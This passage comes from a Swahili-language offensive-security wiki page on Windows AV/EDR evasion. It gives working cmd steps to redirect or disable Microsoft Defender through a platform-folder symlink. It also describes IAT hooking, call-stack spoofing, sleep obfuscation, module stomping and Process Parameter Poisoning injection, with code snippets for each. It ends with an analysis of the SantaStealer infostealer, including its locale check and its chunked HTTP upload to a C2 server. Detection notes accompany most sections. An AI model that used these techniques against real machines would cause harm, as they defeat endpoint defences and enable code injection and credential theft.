- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Kuharibu Microsoft Defender kupitia Platform Version Folder Symlink Hijack

Windows Defender huchagua platform ambayo itaendesha kwa kuorodhesha subfolders zilizo chini ya:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Huchagua subfolder yenye lexicographic version string ya juu zaidi (kwa mfano, `4.18.25070.5-0`), kisha huanzisha processes za Defender service kutoka hapo (ikisasisha service/registry paths ipasavyo). Uchaguzi huu huamini directory entries, ikiwemo directory reparse points (symlinks). Administrator anaweza kutumia hili kuelekeza Defender kwenye path inayoweza kuandikwa na attacker na kufanikisha DLL sideloading au service disruption.

Masharti ya awali
- Local Administrator (inahitajika kuunda directories/symlinks chini ya Platform folder)
- Uwezo wa kufanya reboot au kusababisha Defender kuchagua tena platform (service restart wakati wa boot)
- Built-in tools pekee zinahitajika (mklink)

Kwa nini inafanya kazi
- Defender huzuia writes kwenye folders zake yenyewe, lakini platform selection yake huamini directory entries na kuchagua version iliyo juu zaidi kwa mpangilio wa lexicographic bila kuthibitisha kuwa target inaelekea kwenye protected/trusted path.

Hatua kwa hatua (mfano)
1) Andaa clone inayoweza kuandikwa ya platform folder ya sasa, kwa mfano `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Unda directory symlink ya higher-version ndani ya Platform inayoelekeza kwenye folda yako:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Uteuzi wa trigger (reboot inapendekezwa):
```cmd
shutdown /r /t 0
```
4) Thibitisha kuwa MsMpEng.exe (WinDefend) inaendeshwa kutoka kwenye njia iliyoelekezwa upya:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Unapaswa kuona path mpya ya process chini ya `C:\TMP\AV\` na service configuration/registry ikionyesha eneo hilo.

Post-exploitation options
- DLL sideloading/code execution: Weka au badilisha DLL ambazo Defender hupakia kutoka application directory yake ili kutekeleza code katika processes za Defender. Tazama sehemu iliyo hapo juu: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Ondoa version-symlink ili wakati wa start inayofuata path iliyosanidiwa isitatuliwe na Defender ishindwe kuanza:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Kumbuka kwamba technique hii haitoi privilege escalation yenyewe; inahitaji admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams zinaweza kuhamisha runtime evasion kutoka kwenye C2 implant na kuiweka ndani ya target module yenyewe kwa ku-hook Import Address Table (IAT) yake na kuelekeza APIs zilizochaguliwa kupitia attacker-controlled, position‑independent code (PIC). Hii inapanua evasion zaidi ya API surface ndogo inayotolewa na kits nyingi (kwa mfano, CreateProcessA), na pia inaweka protections hizo hizo kwa BOFs na post‑exploitation DLLs.

High-level approach
- Stage PIC blob pamoja na target module kwa kutumia reflective loader (iliyowekwa mwanzoni au companion). PIC lazima iwe self‑contained na position‑independent.
- Host DLL inapoload, pitia IMAGE_IMPORT_DESCRIPTOR yake na upatch IAT entries za targeted imports (kwa mfano, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) ili zielekeze kwenye thin PIC wrappers.
- Kila PIC wrapper hutekeleza evasions kabla ya ku-tail-call real API address. Evasions za kawaida zinajumuisha:
- Memory mask/unmask kuzunguka call (kwa mfano, encrypt beacon regions, RWX→RX, kubadilisha page names/permissions), kisha kurejesha hali baada ya call.
- Call-stack spoofing: tengeneza stack isiyo na madhara na uingie kwenye target API ili call-stack analysis itatue hadi kwenye frames zinazotarajiwa.
- Kwa compatibility, export interface ili Aggressor script (au equivalent) iweze kusajili APIs za ku-hook kwa Beacon, BOFs na post‑ex DLLs.

Why IAT hooking here
- Hufanya kazi kwa code yoyote inayotumia hooked import, bila kubadilisha tool code au kutegemea Beacon ku-proxy APIs maalum.
- Inashughulikia post‑ex DLLs: ku-hook LoadLibrary* hukuwezesha ku-intercept module loads (kwa mfano, System.Management.Automation.dll, clr.dll) na kutumia masking/stack evasion hiyo hiyo kwenye API calls zao.
- Hurejesha matumizi ya kuaminika ya process-spawning post‑ex commands dhidi ya detections zinazotegemea call-stack kwa ku-wrapper CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Tumia patch baada ya relocations/ASLR na kabla ya matumizi ya kwanza ya import. Reflective loaders kama TitanLdr/AceLdr zinaonyesha hooking wakati wa DllMain ya module iliyopakiwa.
- Weka wrappers ndogo na salama kwa PIC; resolve API halisi kupitia thamani ya awali ya IAT uliyonasa kabla ya ku-patch au kupitia LdrGetProcedureAddress.
- Tumia mabadiliko ya RW → RX kwa PIC na epuka kuacha pages zikiwa writable+executable.

Call‑stack spoofing stub
- PIC stubs za mtindo wa Draugr huunda call chain bandia (return addresses ndani ya modules zisizo na madhara) kisha huingia kwenye API halisi.
- Hii hushinda detections zinazotarajia stacks za kawaida kutoka Beacon/BOFs kwenda kwenye APIs nyeti.
- Ziunganishe na stack cutting/stack stitching techniques ili kuingia ndani ya frames zinazotarajiwa kabla ya API prologue.

Operational integration
- Weka reflective loader mwanzoni mwa post‑ex DLLs ili PIC na hooks zianze kiotomatiki DLL inapopakiwa.
- Tumia Aggressor script kusajili target APIs ili Beacon na BOFs zinufaike moja kwa moja na njia ileile ya evasion bila mabadiliko ya code.

Detection/DFIR considerations
- IAT integrity: entries zinazo-resolve kwenda kwenye anwani zisizo za image (heap/anon); fanya verification ya import pointers mara kwa mara.
- Stack anomalies: return addresses zisizo za loaded images; mabadiliko ya ghafla kwenda non-image PIC; RtlUserThreadStart ancestry isiyolingana.
- Loader telemetry: writes za ndani ya process kwenda IAT, shughuli za mapema za DllMain zinazobadilisha import thunks, RX regions zisizotarajiwa zinazoundwa wakati wa load.
- Image-load evasion: ikiwa una-hook LoadLibrary*, fuatilia loads zinazotia shaka za automation/clr assemblies zinazoendana na memory masking events.

Related building blocks and examples
- Reflective loaders zinazofanya IAT patching wakati wa load (mfano, TitanLdr, AceLdr)
- Memory masking hooks (mfano, simplehook) na stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (mfano, Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

Ikiwa unadhibiti reflective loader, unaweza ku-hook imports **wakati wa `ProcessImports()`** kwa kubadilisha pointer ya `GetProcAddress` ya loader na custom resolver inayokagua hooks kwanza:

- Unda **resident PICO** (persistent PIC object) inayobaki baada ya transient loader PIC kujifuta.
- Export function ya `setup_hooks()` inayobadilisha import resolver ya loader (mfano, `funcs.GetProcAddress = _GetProcAddress`).
- Ndani ya `_GetProcAddress`, ruka ordinal imports na utumie hook lookup inayotegemea hash kama `__resolve_hook(ror13hash(name))`. Ikiwa hook ipo, irudishe; vinginevyo delegate kwenda kwenye `GetProcAddress` halisi.
- Sajili hook targets wakati wa link kwa Crystal Palace `addhook "MODULE$Func" "hook"` entries. Hook hubaki valid kwa sababu iko ndani ya resident PICO.

Hii huzalisha **import-time IAT redirection** bila ku-patch code section ya DLL iliyopakiwa baada ya load.

### Forcing hookable imports when the target uses PEB-walking

Import-time hooks huchochewa tu ikiwa function ipo kwenye IAT ya target. Ikiwa module inaresolve APIs kupitia PEB-walk + hash (bila import entry), lazimisha import halisi ili loader's `ProcessImports()` path iione:

- Badilisha hashed export resolution (mfano, `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) na direct reference kama `&WaitForSingleObject`.
- Compiler itaemit IAT entry, hivyo interception itawezekana reflective loader inaporesolve imports.

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

Badala ya ku-patch `Sleep`, hook **wait/IPC primitives halisi** zinazotumiwa na implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Kwa waits ndefu, zungushia call kwenye obfuscation chain ya mtindo wa Ekko inayosimba image iliyo memory wakati wa idle:

- Tumia `CreateTimerQueueTimer` kupanga mfululizo wa callbacks zinazoita `NtContinue` zikiwa na crafted `CONTEXT` frames.
- Chain ya kawaida (x64): weka image kuwa `PAGE_READWRITE` → RC4 encrypt kupitia `advapi32!SystemFunction032` kwenye mapped image yote → fanya blocking wait → RC4 decrypt → **rejesha per-section permissions** kwa kutembea kwenye PE sections → signal completion.
- `RtlCaptureContext` hutoa template `CONTEXT`; i-clone kwenye frames nyingi na uweke registers (`Rip/Rcx/Rdx/R8/R9`) ili ku-invoke kila hatua.

Operational detail: rudisha “success” kwa waits ndefu (mfano, `WAIT_OBJECT_0`) ili caller iendelee wakati image imefichwa. Pattern hii huficha module kutoka kwa scanners wakati wa idle windows na huepuka signature ya kawaida ya “patched `Sleep()`”.

Detection ideas (telemetry-based)
- Bursts za `CreateTimerQueueTimer` callbacks zinazoelekea kwenye `NtContinue`.
- `advapi32!SystemFunction032` ikitumiwa kwenye buffers kubwa zinazopakana na zenye ukubwa wa image.
- `VirtualProtect` ya range kubwa ikifuatiwa na urejeshaji maalum wa per-section permissions.

### Runtime CFG registration for sleep-obfuscation gadgets

Kwenye targets zilizo na CFG, indirect jump ya kwanza kwenda kwenye mid-function gadget kama `jmp [rbx]` au `jmp rdi` kwa kawaida ita-crash process ikiwa na `STATUS_STACK_BUFFER_OVERRUN` kwa sababu gadget haipo kwenye CFG metadata ya module. Ili kuweka chains za Ekko/Kraken zikiendelea ndani ya processes zilizo-hardened:

- Sajili kila indirect destination inayotumiwa na chain kupitia `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` na `CFG_CALL_TARGET_VALID` entries.
- Kwa addresses zilizo ndani ya loaded images (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` lazima ianze kwenye **image base** na ifunike **image size yote**.
- Kwa manually mapped/PIC/stomped regions, tumia **allocation base** na allocation size badala yake.
- Weka alama si dispatch gadget pekee, bali pia exports zinazofikiwa indirectly (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls) na executable sections zozote zinazodhibitiwa na attacker ambazo zitakuwa indirect targets.

Hii hubadilisha sleep chains za mtindo wa ROP/JOP kutoka “hufanya kazi tu kwenye non-CFG processes” kuwa primitive inayoweza kutumika tena kwa `explorer.exe`, browsers, `svchost.exe`, na endpoints nyingine zilizocompile na `/guard:cf`.

### CET-safe stack spoofing for sleeping threads

Full `CONTEXT` replacement inaonekana wazi na inaweza kuvuruga kwenye CET Shadow Stack systems kwa sababu spoofed `Rip` lazima bado ilingane na hardware shadow stack. Pattern salama zaidi ya sleep-masking ni:

- Chagua thread nyingine ndani ya process hiyo hiyo na usome `NT_TIB` / TEB stack bounds zake (`StackBase`, `StackLimit`) kupitia `NtQueryInformationThread`.
- Hifadhi nakala ya TEB/TIB halisi ya current thread.
- Nasa sleeping context halisi kwa `GetThreadContext`.
- Nakili **`Rip` halisi pekee** kwenye spoof context, ukiacha spoofed `Rsp`/stack state ikiwa ilivyo.
- Wakati wa sleep window, nakili `NT_TIB` ya spoof thread ndani ya current TEB ili stack walkers zi-unwind ndani ya legitimate stack range.
- Baada ya wait kumalizika, rejesha TIB halisi na thread context.

Hii huhifadhi instruction pointer inayolingana na CET huku ikipotosha EDR stack walkers zinazoamini TEB stack metadata kuthibitisha unwinds.

### APC-based alternative: Kraken Mask

Ikiwa timer-queue dispatch ina signatures nyingi sana, sequence ileile ya sleep-encrypt-spoof-restore inaweza kutekelezwa kutoka suspended helper thread kwa kutumia queued APCs:

- Unda helper thread yenye `NtTestAlert` kama entrypoint.
- Queue prepared `CONTEXT` frames/APCs kwa `NtQueueApcThread` na zimalize kwa `NtAlertResumeThread`.
- Hifadhi chain state kwenye heap badala ya helper stack ili kuepuka kuimaliza default 64 KB thread stack.
- Tumia `NtSignalAndWaitForSingleObject` kusignal start event atomically na kublock.
- Suspend main thread kabla ya kurejesha TIB/context (`NtSuspendThread` → restore → `NtResumeThread`) ili kupunguza race window ambayo scanner inaweza kunasa stack iliyorejeshwa nusu.

Hii hubadilisha signature ya `CreateTimerQueueTimer` + `NtContinue` kuwa signature ya helper-thread/APC huku ikihifadhi malengo yale yale ya RC4 masking na stack-spoofing.

Additional detection ideas
- `NtSetInformationVirtualMemory` yenye `VmCfgCallTargetInformation` muda mfupi kabla ya sleeps, waits, au APC dispatch.
- `GetThreadContext`/`SetThreadContext` iliyozungushiwa `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject`, au `ConnectNamedPipe`.
- `NtQueryInformationThread` ikifuatiwa na writes za moja kwa moja kwenye TEB/TIB stack bounds za current thread.
- Chains za `NtQueueApcThread`/`NtAlertResumeThread` zinazofikia indirectly `SystemFunction032`, `VirtualProtect`, au helpers za section-permission restoration.
- Matumizi ya mara kwa mara ya short gadget signatures kama `FF 23` (`jmp [rbx]`) au `FF E7` (`jmp rdi`) kama dispatch pivots ndani ya signed modules.


## Precision Module Stomping

Module stomping hutekeleza payloads kutoka **`.text` section ya DLL ambayo tayari ime-mapped ndani ya target process** badala ya ku-allocate private executable memory inayoonekana wazi au kupakia sacrificial DLL mpya. Overwrite target inapaswa kuwa **loaded, disk-backed image** ambayo code space yake inaweza kubeba payload bila kuharibu code paths ambazo process bado inahitaji.

### Reliable target selection

Naive stomping dhidi ya modules za kawaida kama `uxtheme.dll` au `comctl32.dll` si thabiti: DLL inaweza kuwa haijapakiwa kwenye remote process, na code region iliyo ndogo sana ita-crash process. Workflow inayotegemeka zaidi ni:

1. Enumerate target process modules na uweke **names-only include list** ya DLLs ambazo tayari zimepakiwa.
2. Build payload kwanza na urekodi **exact byte size** yake.
3. Scan candidate DLLs kwenye disk na ulinganishe PE section **`.text` `Misc_VirtualSize`** na payload size. Hili ni muhimu zaidi kuliko file size kwa sababu linaakisi ukubwa wa executable section **inapomapped kwenye memory**.
4. Parse **Export Address Table (EAT)** na uchague exported function RVA kama stomp start offset.
5. Kokotoa **blast radius**: ikiwa payload inazidi selected function boundary, ita-overwrite adjacent exports zilizopangwa baada yake kwenye memory.

Typical recon/selection helpers seen in the wild:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Maelezo ya uendeshaji
- Prefer DLLs **zilizokwisha loaded** katika remote process ili kuepuka telemetry ya `LoadLibrary`/unexpected image loads.
- Prefer exports ambazo hazitekelezwi mara kwa mara na target application; vinginevyo normal code paths zinaweza kufikia stomped bytes kabla au baada ya thread creation.
- Implants kubwa mara nyingi huhitaji kubadilisha shellcode embedding kutoka string literal kuwa **byte-array/braced initializer** ili buffer nzima iwakilishwe kwa usahihi katika injector source.

Mawazo ya Detection
- Remote writes zinazoingia kwenye **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) badala ya private RWX/RX allocations zinazotumika mara nyingi.
- Export entry points ambazo bytes zake za in-memory hazilingani tena na backing file iliyo kwenye disk.
- Remote threads au context pivots zinazoanza execution ndani ya legitimate DLL export ambayo first bytes zake zilibadilishwa hivi karibuni.
- Sequences za kutia shaka za `VirtualProtect(Ex)` / `WriteProcessMemory` dhidi ya DLL `.text` pages zikifuatiwa na thread creation.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) ni **process-injection / EDR-evasion** technique inayokwepa classic remote write path (`VirtualAllocEx` + `WriteProcessMemory`). Badala ya kunakili bytes ndani ya target inayoendelea kufanya kazi, inatumia ukweli kwamba Windows **hunakili selected `CreateProcessW` startup parameters ndani ya child process** na kuzihifadhi ndani ya `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).

### Poisonable carriers copied by `CreateProcessW`

Carriers muhimu ni:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (with `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Vikwazo vya practical carrier:

- `lpCommandLine` lazima ielekeze kwenye **writable memory** kwa ajili ya `CreateProcessW`, na ina kikomo cha **Unicode characters 32,767** ikijumuisha null terminator.
- `lpEnvironment` lazima iwe Unicode environment block yenye strings zinazofuatana za `NAME=VALUE\0`, zikimalizwa na `\0` ya ziada.
- `lpReserved` imehifadhiwa rasmi, kwa hiyo mapping ya `ShellInfo` inapaswa kuchukuliwa kama implementation detail badala ya stable documented contract.

Hii inabadilisha normal process creation kuwa **payload-transfer primitive**. Operator huunda child process yenye startup data inayodhibitiwa na attacker na kuacha Windows ifanye cross-process copy.

### Remote lookup flow without remote write APIs

Baada ya child kuundwa, resolve copied buffer kwa kutumia **read-only** primitives:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → pata `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Soma remote `PEB`
3. Fuata `PEB.ProcessParameters`
4. Soma `RTL_USER_PROCESS_PARAMETERS`
5. Tumia pointer iliyochaguliwa:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Minimal flow:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Kutekeleza parameter buffer iliyonakiliwa

Eneo la parameter lililonakiliwa kwa kawaida huwa `RW`, si executable. P3 chain ya kawaida ni:

1. Unda process kwa kawaida (bila suspended)
2. Fanya ukurasa wa parameter uliochaguliwa uwe executable kwa `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Tumia tena main thread handle ambayo tayari imerudishwa katika `PROCESS_INFORMATION`
4. Elekeza execution kwa `NtSetContextThread` (`CONTEXT_CONTROL`, overwrite `RIP`)

Tofauti na workflows za kawaida za thread hijacking, hii **haihitaji** `SuspendThread` / `ResumeThread`; context inaweza kubadilishwa moja kwa moja kwenye returned main thread handle.

Hii huepuka APIs kadhaa ambazo kwa kawaida hufuatiliwa kwa injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- mara nyingi pia `SuspendThread` / `ResumeThread`

### Kizuizi cha null-byte na staged shellcode

Carriers zote tatu ni **string au data inayofanana na string**, hivyo raw payload iliyo na `0x00` hukatizwa wakati wa transfer. Workaround ya kivitendo ni **first stage isiyo na null** ambayo huunda upya constants wakati wa runtime, kisha kupakia second stage ya aina yoyote.

Pattern rahisi ni XOR-based constant synthesis:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Hii huruhusu first stage kujenga stack strings, API arguments, DLL paths, au second-stage shellcode loader bila kuingiza null bytes kwenye transported parameter.

### Stack-based API calls kutoka first stage

Wakati first stage lazima iite APIs kama `LoadLibraryA`, inaweza:

- kusukuma string/buffer kwenye target stack
- kutenga **32-byte x64 shadow space**
- kuweka `RCX`, `RDX`, `R8`, `R9` kuwa constants au pointers zinazohusiana na `RSP`
- kuweka `RSP` ikiwa **16-byte aligned** kabla ya call

Second stage inaweza kisha kunakiliwa kutoka stack hadi kwenye allocation ya `PAGE_READWRITE`, kubadilishwa kuwa `PAGE_EXECUTE_READ` kwa `VirtualProtect`, na kurukiiwa, hivyo kuepuka allocation ya moja kwa moja ya RWX.

### Mawazo ya Detection

Fursa nzuri za hunting zilizotajwa na waandishi:

- `VirtualProtectEx` / `NtProtectVirtualMemory` kufanya **process-parameter pages** ziwe executable
- protection change hiyo ikifuatiwa na `SetThreadContext` / `NtSetContextThread`
- reads za mbali za `PEB` na kisha `RTL_USER_PROCESS_PARAMETERS`
- `lpCommandLine`, `lpEnvironment`, au `STARTUPINFO.lpReserved` zenye urefu usio wa kawaida / entropy ya juu wakati wa process creation

### Notes

- P3 ni **cross-process transfer trick**, si full execution primitive yenyewe: parameter iliyonakiliwa bado inahitaji execute-permission change na execution redirection method.
- `RtlCreateProcessReflection` / Dirty Vanity ilizingatiwa na waandishi lakini ikakataliwa kwa sababu internally hufikia primitives zenye mashaka kama `NtWriteVirtualMemory` na `NtCreateThreadEx`.

## SantaStealer Tradecraft kwa Fileless Evasion na Credential Theft

SantaStealer (pia hujulikana kama BluelineStealer) inaonyesha jinsi modern info-stealers zinavyochanganya AV bypass, anti-analysis na credential access ndani ya workflow moja.

### Keyboard layout gating na sandbox delay

- Config flag (`anti_cis`) huorodhesha installed keyboard layouts kupitia `GetKeyboardLayoutList`. Ikiwa Cyrillic layout itapatikana, sample huunda marker tupu ya `CIS` na kusitisha kabla ya kuendesha stealers, hivyo kuhakikisha kwamba hai-detoni kamwe kwenye excluded locales huku ikiacha hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Logic ya `check_antivm` yenye tabaka

- Variant A hupitia orodha ya processes, huhash kila jina kwa custom rolling checksum, na kuilinganisha na blocklists zilizopachikwa za debuggers/sandboxes; hurudia checksum kwenye jina la computer na hukagua working directories kama `C:\analysis`.
- Variant B hukagua sifa za mfumo (kiwango cha chini cha process-count, uptime ya hivi karibuni), huita `OpenServiceA("VBoxGuest")` ili kugundua VirtualBox additions, na hufanya timing checks kuzunguka sleeps ili kutambua single-stepping. Hit yoyote husababisha abort kabla modules hazijazinduliwa.

### Fileless helper + reflective loading ya ChaCha20 mara mbili

- DLL/EXE kuu hupachika Chromium credential helper ambayo huandikwa kwenye disk au ku-mapped manually ndani ya memory; katika fileless mode, imports/relocations hutatuliwa yenyewe, hivyo hakuna helper artifacts zinazoandikwa.
- Helper huyo huhifadhi DLL ya second-stage iliyosimbwa mara mbili kwa ChaCha20 (keys mbili za baiti 32 + nonces za baiti 12). Baada ya passes zote mbili, hupakia blob kwa reflective loading (bila `LoadLibrary`) na kuita exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` zilizotokana na [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Routines za ChromElevator hutumia direct-syscall reflective process hollowing ku-inject kwenye Chromium browser iliyo hai, kurithi AppBound Encryption keys, na kusimbua passwords/cookies/credit cards moja kwa moja kutoka SQLite databases licha ya ABE hardening.


### Ukusanyaji wa modular wa in-memory na HTTP exfil ya vipande

- `create_memory_based_log` hupitia global `memory_generators` function-pointer table na kuanzisha thread moja kwa kila module iliyowashwa (Telegram, Discord, Steam, screenshots, documents, browser extensions, n.k.). Kila thread huandika matokeo kwenye shared buffers na kuripoti file count yake baada ya join window ya takribani sekunde 45.
- Baada ya kukamilika, kila kitu huwekwa kwenye ZIP kwa kutumia library ya `miniz` iliyolinkiwa statically kama `%TEMP%\\Log.zip`. Kisha `ThreadPayload1` husubiri sekunde 15 na kutuma archive hiyo kwa streams za vipande vya MB 10 kupitia HTTP POST kwenda `http://<C2>:6767/upload`, huku ikijifanya browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Kila kipande huongeza `User-Agent: upload`, `auth: <build_id>`, `w: <campaign_tag>` ya hiari, na kipande cha mwisho huongeza `complete: true` ili C2 ijue kuwa reassembly imekamilika.

## References

- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)

{{#include ../banners/hacktricks-training.md}}
